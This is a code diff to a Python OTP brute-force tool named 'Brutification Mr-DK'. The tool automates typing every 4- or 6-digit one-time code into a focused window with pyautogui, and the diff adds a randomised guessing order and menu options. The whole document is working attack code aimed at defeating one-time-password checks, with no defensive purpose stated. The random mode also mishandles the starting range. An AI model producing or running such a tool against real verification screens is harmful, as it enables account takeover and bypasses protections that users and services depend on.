@@ -5,6 +5,7 @@ import sys
 import json
 import os
 import pyautogui
+import random
 
 # File to store settings
 SETTINGS_FILE = "bruteforce_settings.json"
@@ -14,8 +15,12 @@ default_settings = {
     "otp_length": 4,
     "start_range": 1001,
     "speed": 1.0,
-    "timeout": 0  # 0 means no timeout
+    "timeout": 0,  # 0 means no timeout
+    "mode": "sequential"  # Default mode
 }
+
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
 def load_settings():
     if os.path.exists(SETTINGS_FILE):
@@ -34,17 +39,19 @@ def save_settings(settings):
         json.dump(settings, f)
 
 def display_menu(settings):
+    clear_screen()
     print("\n--- Brutification Mr-DK ---")
-    print(f"1. Start brute force ")
+    print(f"1. Start brute force (Mode: {settings['mode']})")
     print("2. Set OTP length (4 or 6)")
     print(f"3. Set starting range (current: {settings['start_range']})")
     print(f"4. Set entry speed (current: {settings['speed']} seconds)")
     print(f"5. Set timeout (current: {settings['timeout']} minutes)")
-    print("6. Exit")
-    choice = input("Enter your choice (1-6): ")
+    print(f"6. Set brute force mode (current: {settings['mode']})")
+    print("7. Exit")
+    choice = input("Enter your choice (1-7): ")
 
-    if not choice.isdigit() or int(choice) not in range(1, 7):
-        print("Invalid choice! Please enter a number between 1 and 6.")
+    if not choice.isdigit() or int(choice) not in range(1, 8):
+        print("Invalid choice! Please enter a number between 1 and 7.")
         return display_menu(settings)
     
     return int(choice)
@@ -87,6 +94,14 @@ def set_timeout(settings):
     except ValueError:
         print("Invalid timeout! Please enter a non-negative integer.")
 
+def set_mode(settings):
+    mode = input(f"Enter brute force mode (sequential or random, current: {settings['mode']}): ").lower()
+    if mode not in ['sequential', 'random']:
+        print("Invalid mode! Please enter 'sequential' or 'random'.")
+    else:
+        settings['mode'] = mode
+        save_settings(settings)
+
 def brute_force_otp(settings):
     print("Starting brute force in 5 seconds...")
     time.sleep(5)
@@ -94,8 +109,16 @@ def brute_force_otp(settings):
     max_value = 10**settings['otp_length'] - 1  # e.g., 9999 for 4-digit, 999999 for 6-digit
     start_time = time.time()
     timeout_seconds = settings['timeout'] * 60
+
+    if settings['mode'] == 'sequential':
+        otp_range = range(settings['start_range'], max_value + 1)
+    elif settings['mode'] == 'random':
+        otp_range = random.sample(range(0, max_value + 1), max_value + 1 - settings['start_range'])
+    else:
+        print("Invalid mode selected. Defaulting to sequential.")
+        otp_range = range(settings['start_range'], max_value + 1)
     
-    for otp in range(settings['start_range'], max_value + 1):
+    for otp in otp_range:
         otp_str = str(otp).zfill(settings['otp_length'])  # Ensure the OTP has the correct length (e.g., 0001, 0023)
         
         # Use pyautogui to enter OTP and press Enter
@@ -129,6 +152,8 @@ def main():
         elif choice == 5:
             set_timeout(settings)
         elif choice == 6:
+            set_mode(settings)
+        elif choice == 7:
             sys.exit()
         else:
             print("Invalid option! Please select a valid option.")
